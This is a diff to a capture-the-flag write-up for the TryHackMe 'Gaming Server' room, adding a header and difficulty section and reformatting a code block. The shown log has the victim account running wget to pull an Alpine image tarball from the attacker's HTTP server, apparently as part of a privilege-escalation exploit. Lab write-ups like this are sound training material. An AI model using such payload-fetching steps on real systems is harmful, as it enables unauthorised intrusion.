@@ -1,3 +1,18 @@
+# Gaming Server
+
+This is my write-up for the room [Gaming Server]Basic Pentesting] (https://tryhackme.com/room/gamingserver)
+
+Description: Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.
+
+
+## Difficulty
+My Difficulty: VERY Easy
+
+Try Hackme Difficulty:
+
+![80d16a6756c805903806f7ecbdd80f6d](https://user-images.githubusercontent.com/68706090/164374344-524a6bee-7187-4762-ae57-6ba8eacc7d51.jpeg)
+
+
 # Emumeration
 
 ### NMAP
@@ -354,7 +369,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 running the exploit on the victim machine
 
- ```
+ ```console
  john@exploitable:~$ wget http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
 --2022-04-21 04:37:55--  http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
 Connecting to 10.13.27.142:8000... connected.
